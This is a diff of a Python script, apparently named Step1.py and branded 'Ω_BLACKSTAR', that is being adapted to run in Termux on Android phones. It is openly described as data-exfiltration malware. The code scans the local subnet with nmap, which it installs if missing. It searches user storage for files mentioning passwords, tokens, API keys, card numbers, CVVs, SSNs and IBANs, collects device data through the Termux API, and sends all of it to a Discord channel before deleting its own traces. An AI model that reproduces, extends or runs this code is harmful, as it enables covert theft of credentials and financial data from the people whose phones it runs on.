@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Step1.py – Advanced Data Exfiltration & Self‑Destruct
+Step1.py – Advanced Data Exfiltration & Self‑Destruct (Termux‑optimised)
 Uses threading to collect IP, scan network, harvest files, and exfiltrate via Discord.
 FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
 """
@@ -60,6 +60,8 @@ def get_public_ip():
         return "unknown"
 
 def get_local_ip():
+    """Get local IP using Termux-friendly methods."""
+    # Try ifconfig first (may not be installed)
     try:
         result = subprocess.run(["ifconfig"], capture_output=True, text=True)
         for line in result.stdout.splitlines():
@@ -70,9 +72,23 @@ def get_local_ip():
                         ip = parts[i+1]
                         if ip.startswith(("192.168.", "10.", "172.")):
                             return ip
-        return None
     except:
-        return None
+        pass
+
+    # Fallback to 'ip addr'
+    try:
+        result = subprocess.run(["ip", "-4", "addr"], capture_output=True, text=True)
+        for line in result.stdout.splitlines():
+            if "inet " in line and "127.0.0.1" not in line:
+                parts = line.strip().split()
+                for i, part in enumerate(parts):
+                    if part == "inet" and i+1 < len(parts):
+                        ip = parts[i+1].split('/')[0]
+                        if ip.startswith(("192.168.", "10.", "172.")):
+                            return ip
+    except:
+        pass
+    return None
 
 def is_vpn(ip):
     if not ip:
@@ -86,6 +102,20 @@ def is_vpn(ip):
             return True
     return False
 
+def ensure_nmap():
+    """Install nmap if not present."""
+    try:
+        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
+        return True
+    except:
+        print(f"{C}[*] nmap not found, installing...{W}")
+        try:
+            subprocess.run(["pkg", "install", "nmap", "-y"], capture_output=True, check=True)
+            return True
+        except:
+            print(f"{R}[!] Failed to install nmap{W}")
+            return False
+
 # ============================================================
 # THREAD 1: IP & NMAP SCAN
 # ============================================================
@@ -95,7 +125,7 @@ def thread_ip_nmap():
     ip_info = f"Local: {local or 'N/A'}\nPublic: {public}"
     send_to_discord(f"📡 **IP Info**\n```\n{ip_info}\n```")
 
-    if local and not is_vpn(local):
+    if local and not is_vpn(local) and ensure_nmap():
         subnet = ".".join(local.split(".")[:3]) + ".0/24"
         print(f"{C}[*] Scanning subnet: {subnet}{W}")
         try:
@@ -110,20 +140,26 @@ def thread_ip_nmap():
             print(f"{R}[!] Nmap error: {e}{W}")
 
 # ============================================================
-# THREAD 2: FILE SYSTEM HARVEST
+# THREAD 2: FILE SYSTEM HARVEST (Termux-friendly paths)
 # ============================================================
 def thread_file_harvest():
     results = []
-    # Directories to scan (avoid massive scans)
-    targets = ["/", "/storage/emulated/0", "/sdcard", "/data/data/com.termux/files/home"]
+    # Only scan accessible directories in Termux
+    home = str(Path.home())
+    storage = "/storage/emulated/0"
+    sdcard = "/sdcard"
+    targets = [home, storage, sdcard]
+    # Filter out non-existent
+    targets = [t for t in targets if os.path.exists(t)]
+
     extensions = [".txt", ".log", ".json", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".html", ".css", ".js", ".py", ".sh", ".bash", ".zsh", ".rc", ".env", ".properties"]
     important_keywords = ["password", "token", "api_key", "secret", "key", "pwd", "pass", "login", "username", "email", "credit", "card", "cvv", "ssn", "iban"]
 
     for base in targets:
         if not os.path.exists(base):
             continue
+        # Limit depth to avoid long scans
         for root, dirs, files in os.walk(base, topdown=True, onerror=lambda e: None):
-            # Limit depth to avoid endless traversal
             depth = root.replace(base, "").count(os.sep)
             if depth > 4:
                 continue
@@ -132,13 +168,12 @@ def thread_file_harvest():
                     path = os.path.join(root, f)
                     try:
                         size = os.path.getsize(path)
-                        if size > 10 * 1024 * 1024:  # skip files >10MB
+                        if size > 10 * 1024 * 1024:  # skip >10MB
                             continue
                         with open(path, 'r', encoding='utf-8', errors='ignore') as file:
                             content = file.read()
                         for kw in important_keywords:
                             if kw in content.lower():
-                                # Found interesting info
                                 snippet = content[:500] + ("..." if len(content)>500 else "")
                                 results.append({
                                     "file": path,
@@ -150,7 +185,6 @@ def thread_file_harvest():
                     except:
                         pass
 
-    # Save results to JSON
     if results:
         with open("harvest.json", "w") as f:
             json.dump(results, f, indent=2)
@@ -178,7 +212,6 @@ def thread_termux_api():
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
             if result.returncode == 0 and result.stdout.strip():
-                # Try to parse as JSON
                 try:
                     data = json.loads(result.stdout)
                     api_data[key] = data
@@ -194,39 +227,19 @@ def thread_termux_api():
         os.remove("api_data.json")
 
 # ============================================================
-# BLOCK IP & SELF-DESTRUCT
+# SELF-DESTRUCT (safe for Termux)
 # ============================================================
-def block_ip(ip):
-    if not ip:
-        return
-    try:
-        # Try iptables (needs root)
-        subprocess.run(["su", "-c", f"iptables -I OUTPUT -d {ip} -j REJECT"], 
-                       capture_output=True, timeout=5)
-        send_to_discord(f"🚫 **IP blocked**: {ip} (iptables)")
-    except:
-        # Fallback to /etc/hosts
-        try:
-            with open("/etc/hosts", "a") as f:
-                f.write(f"127.0.0.1 {ip}\n")
-            send_to_discord(f"🚫 **IP blocked**: {ip} (hosts)")
-        except:
-            pass
-
 def self_destruct():
+    """Delete temporary files and exit cleanly."""
     time.sleep(2)
-    files = ["Step1.py", "main.py", "nmap_scan.txt", "harvest.json", "api_data.json"]
+    files = ["nmap_scan.txt", "harvest.json", "api_data.json"]
     for f in files:
         if os.path.exists(f):
             try:
                 os.remove(f)
             except:
                 pass
-    # Delete the script itself
-    try:
-        os.remove(os.path.abspath(sys.argv[0]))
-    except:
-        pass
+    # Do NOT delete the script itself to avoid interfering with parent.
     sys.exit(0)
 
 # ============================================================
@@ -234,7 +247,7 @@ def self_destruct():
 # ============================================================
 def main():
     print(f"\n{C}{'='*60}{W}")
-    print(f"{C}Ω_BLACKSTAR – Step1.py Initializing...{W}")
+    print(f"{C}Ω_BLACKSTAR – Step1.py (Termux edition) Initializing...{W}")
     print(f"{C}{'='*60}{W}\n")
 
     # Start threads
@@ -246,15 +259,15 @@ def main():
     t2.start()
     t3.start()
 
-    # Wait for threads (with timeout to ensure completion)
+    # Wait for threads (timeout to ensure they finish)
     t1.join(timeout=120)
     t2.join(timeout=180)
     t3.join(timeout=120)
 
-    # Block IP and self-destruct
+    # Collect final IP for reporting (no blocking)
     public_ip = get_public_ip()
     if public_ip and public_ip != "unknown":
-        block_ip(public_ip)
+        send_to_discord(f"🌐 **Final public IP**: {public_ip}")
 
     send_to_discord("💀 **Self‑destruct sequence initiated**")
     self_destruct()
